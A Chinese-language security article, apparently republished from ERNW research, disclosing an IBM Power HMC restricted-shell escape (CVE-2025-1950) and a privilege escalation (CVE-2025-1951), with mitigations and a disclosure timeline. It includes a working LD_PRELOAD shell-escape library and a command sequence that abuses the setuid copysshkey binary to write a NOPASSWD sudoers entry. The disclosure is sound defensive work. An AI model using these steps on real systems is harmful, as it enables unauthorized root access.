#  IBM Power HMC漏洞披露：受限Shell突破与权限提升   
原创 mag1c7  山石网科安全技术研究院   2025-05-30 08:01  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/NGIAw2Z6vnLzibrp7C4HmazCNIQXMJIRxvbibNMMmxDGrTN0Z9ibYzXnSNKobTzADCPgdo1b7ukKNARFEicHqQiajWw/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8Jb8ZACqDjPdMzgicp2SzdZ19mFnVcBO53s1uA2cSfarQkwibVUeCeH9w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
****  
****  
**攻击者如何利用环境变量和setuid二进制文件获取系统根权限？**  
  
****  
****  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/NGIAw2Z6vnLKuKAwMiaYedpTAYugKibaTBsHzf5pDuztECgfIgOfpG5DRF31jzhosMEj23dlx186q0zgLaIZj9lA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
在近期的红队演练中，研究人员发现了IBM硬件管理控制台（HMC）中的两个关键安全漏洞：受限Shell突破（CVE-2025-1950）和权限提升（CVE-2025-1951）[1]。这些漏洞可能被攻击者利用来突破系统的安全限制，获取更高的权限。本文将详细介绍这两个漏洞的发现过程、攻击路径以及IBM提供的修复措施。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**一、引言**  
  
  
在近期的一次红队演练中，研究人员发现了用于访问IBM硬件管理控制台（HMC）的私钥。IBM硬件管理控制台（HMC）是一种专用管理系统，用于控制和管理IBM服务器，特别是运行Power Systems（如IBM Power9/Power10）和大型机（z Systems）上的服务器。经过简单研究，我们发现了两个可被利用来获取HMC根访问权限的安全漏洞。  
  
  
大多数用户通过SSH进行的访问受到  
hmcbash  
（一种受限shell环境）的限制。攻击者可以利用  
LD_PRELOAD  
突破受限的  
bash  
环境，访问系统上安装的其他二进制文件。突破限制后，攻击者可以使用  
setuid  
二进制文件  
copysshkey  
将权限提升到  
root  
。  
  
  
IBM分别将这两个漏洞追踪为安全公告：环境变量权限设置错误（CVE-2025-1950）影响Power HMC[2]和安全公告：HMC中的漏洞影响进一步的权限提升（CVE-2025-1951）[3]。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**二、突破受限shell**  
  
****  
  
受限shell（hmcbash  
）基于bash的受限模式[4]构建。除其他限制外，这会阻止用户更改目录、指定包含斜杠的命令名称以及修改某些环境变量。此外，多个可能被利用的GTFOBins（如在CVE-2021-29707[5]中被利用的sed  
）已被修复。  
  
  
然而，研究人员发现可以设置环境变量LD_PRELOAD  
，这使得他们能够运行任意二进制文件，而无需在命令中使用斜杠。  
  
  
研究人员使用了一个简单的程序，该程序在应用程序退出时加载/bin/bash  
，如下所示：  
  
```
#include <stdio.h>#include <unistd.h>void exit(int e) {    execve("/bin/bash", NULL, NULL);    while(1);}
```  
  
  
由于用户无法接收通过scp  
发送的文件，我们使用以下命令将库存储在系统上：  
  
```
cat test.so | ssh ibmifcb@XXXXX cp /dev/stdin test.so
```  
  
  
以下摘录展示了如何使用LD_PRELOAD  
进行利用以及在不受限的bash中进行操作：  
  
```
ibmifcb@XXXXX:~> idbash: id: command not foundibmifcb@XXXXX:~> cd /bash: cd: restrictedibmifcb@XXXXX:~> LD_PRELOAD=./test.so lessMissing filename ("less --help" for help)[ibmifcb@XXXXX ibmifcb] $ cd /[ibmifcb@XXXXX /] $ pwd/
```  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**三、权限提升**  
  
  
用户ibmifcb  
的权限仍然非常有限，因此研究人员的下一个目标是提升其权限。快速查看系统后，他们发现了一个设置了setuid  
位的二进制文件copysshkey  
。  
  
```
[ibmifcb@XXXXX /] $ ls -al /opt/hsc/bin/copysshkey-rwsr-xr-x 1 root root 81248 Oct 26  2023 /opt/hsc/bin/copysshkey
```  
  
  
使用此二进制文件，可以将任意公钥写入任何用户的authorized_keys2  
文件中，从而以该用户身份获得SSH访问权限，如下所示：  
  
```
/opt/hsc/bin/copysshkey -o add -u hscroot -k 'ssh - ed25519 [...]'
```  
  
  
此外，该程序既不验证给定的密钥是否为公钥，也不验证用户名。因此，出现了两个问题：  
1. copysshkey  
可用于将任意文本追加到authorized_keys2  
文件中。  
  
1. 用户名可用于路径遍历攻击。  
  
如以下场景所示，这可用于获取具有无密码sudo  
权限的ccfw  
用  
户的访问权限，从而获得root  
访问权限：  
  
```
[ibmifcb@XXXXX ibmifcb] $ pwd/home/ibmifcb[ibmifcb@XXXXX ibmifcb] $ mkdir -p lol/.ssh[ibmifcb@XXXXX ibmifcb] $ ln -s /etc/sudoers lol/.ssh/authorized_keys2[ibmifcb@XXXXX ibmifcb] $ /opt/hsc/bin/copysshkey -o add -u ibmifcb/lol -k 'ibmifcb ALL=(ALL) NOPASSWD: ALL'[ibmifcb@XXXXX ibmifcb] $ sudo -i[root@XXXXX ~] # cat /etc/sudoers[...]Defaults:ccfw   !requirettyccfw ALL=(ALL) NOPASSWD: ALLDefaults:root   !requirettyibmifcb ALL=(ALL) NOPASSWD: ALL
```  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**四、缓解措施**  
  
****  
**（一）防止shell突破**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8WFHRW8Evk0zcqAPJSmSRktqm69UXCNGtz8L1sz1g1Wg3sEYViamG90Q/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
为防止受限shel  
l中的用户将LD_PRELOAD  
设置为自定义值，应将其标记为readonly  
并设置为空字符串。  
  
  
**（二）防止权限提升**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8WFHRW8Evk0zcqAPJSmSRktqm69UXCNGtz8L1sz1g1Wg3sEYViamG90Q/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
应评估是否可以限制copysshkey  
二  
进  
制文件的执行权限。  
  
其次，copysshkey  
程  
序应  
验证用户名是否有效，且不能用于路径遍历攻击。  
  
第三，应验证传递给copysshkey  
的公钥，以防止将任意数据写入文件。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**五、披露时间线**  
  
  
与客户协调后，作者联系了IBM以披露此漏洞。以下是披露时间线的简要总结：  
- **2025年2月18日**  
：向IBM报告问题。  
  
- **2025年3月31日**  
：ERNW联系IBM询问进展。  
  
- **2025年4月22日**  
：IBM确认漏洞并发布修复版本[8]，CVE-2025-195[9]和CVE-2025-1951[10]。  
  
- **2025年4月25日**  
：作者文章公开披露。  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**六、相关链接**  
  
[1]https://insinuator.net/2025/04/ibm-hmc-shell-breakout-privsec/  
  
[2]https://www.ibm.com/support/pages/node/7231507  
  
[3]https://nvd.nist.gov/vuln/detail/CVE-2021-29707  
  
[4]https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html  
  
[5]https://nvd.nist.gov/vuln/detail/CVE-2021-29707  
  
[6]https://www.ibm.com/support/pages/node/7231507  
  
[7]  
https://www.ibm.com/support/pages/node/7231389  
  
[8]https://insinuator.net/2025/04/ibm-hmc-shell-breakout-privsec/[#fn1]()  
  
  
[9]https://nvd.nist.gov/vuln/detail/CVE-2025-1950  
  
[10]https://nvd.nist.gov/vuln/detail/CVE-2025-1951  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8KrXv9sZf93yt4huq2kARyZSgmdnic40GayohIYiaD2FAkkAqJehJSMtQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
山石网科是中国网络安全行业的技术创新领导厂商，由一批知名网络安全技术骨干于2007年创立，并以首批网络安全企业的身份，于2019年9月登陆科创板（股票简称：山石网科，股票代码：688030）。  
  
现阶段，山石网科掌握30项自主研发核心技术，申请560多项国内外专利。山石网科于2019年起，积极布局信创领域，致力于推动国内信息技术创新，并于2021年正式启动安全芯片战略。2023年进行自研ASIC安全芯片的技术研发，旨在通过自主创新，为用户提供更高效、更安全的网络安全保障。目前，山石网科已形成了具备“全息、量化、智能、协同”四大技术特点的涉及  
基础设施安全、云安全、数据安全、应用安全、安全运营、工业互联网安全、信息技术应用创新、安全服务、安全教育等九大类产品服务，50余个行业和场景的完整解决方案。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/NGIAw2Z6vnLzibrp7C4HmazCNIQXMJIRxPibycdiaNQCI4PNojUk3eYCQDZs6c5zNMUkq7yFNeYQIxicAV33eHNdFA/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
